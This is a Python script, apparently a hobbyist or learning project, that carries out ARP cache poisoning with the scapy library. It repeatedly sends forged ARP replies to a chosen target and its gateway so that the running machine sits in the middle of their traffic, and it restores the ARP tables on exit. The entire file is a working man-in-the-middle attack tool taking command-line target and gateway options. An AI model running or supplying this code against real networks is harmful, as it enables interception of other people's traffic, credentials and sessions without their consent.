
import scapy.all as scapy
import time
import sys
import optparse
from termcolor import colored

def get_arguments():
	parser = optparse.OptionParser()
	parser.add_option("-t", "--target", dest = "target", help="Target IP")
	parser.add_option("-g", "--gateway", dest = "gateway", help="gateway IP")
	(options, arguments) = parser.parse_args()
	return options


def get_mac(ip, retries=3, timeout=1):
    for i in range(retries):
        arp_request = scapy.ARP(pdst=ip)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast / arp_request
        answered_list = scapy.srp(arp_request_broadcast, timeout=timeout, verbose=False)[0]
        if answered_list:
            return answered_list[0][1].hwsrc
        else:
            print(colored(f"\n[-] Attempt {i + 1}/{retries} failed: Could not find MAC address for IP: {ip}", 'red'))
            time.sleep(2)
    print(colored(f"\n[-] All attempts failed to find MAC address for IP: {ip}", 'red'))
    return None

def spoof(target_ip,spoof_ip):
    target_mac=get_mac(target_ip)
    if target_mac:
        packet=scapy.ARP(op=2, pdst=target_ip,hwdst=target_mac,psrc=spoof_ip)
        scapy.send(packet,verbose=False)
    else:
        print(colored(f"[-] Could not spoof {target_ip}","red"))

def restore(destination_ip, source_ip):
    destination_mac=get_mac(destination_ip)
    source_mac=get_mac(source_ip)
    if destination_mac and source_mac:
        packet=scapy.ARP(op=2, pdst=destination_ip,hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
        scapy.send(packet,count=4,verbose=False)
        return True
    else:
        print(colored(f"[-] Could not restore {destination_ip} ARP table",'red'))
        return False
sent_packet_count=0
options=get_arguments()
target_ips=options.target
spoof_ips=options.gateway
try:
    while True:
        spoof(target_ips,spoof_ips)
        spoof(spoof_ips,target_ips)
        sent_packet_count=sent_packet_count+2
        print("\r[+]Packets sent: "+str(sent_packet_count),end="")
        sys.stdout.flush()
        time.sleep(2)

except KeyboardInterrupt:
    a=restore(target_ips, spoof_ips)
    b=restore(spoof_ips, target_ips)
    if a and b:
        print(colored("\n[+]Detected Ctrl+C .....Quiting....restoring ARP tables....Please wait",'blue'))
    else:
        print(colored("\n[+]Detected Ctrl+C .....Quiting....couldn't restoring ARP tables", 'blue'))
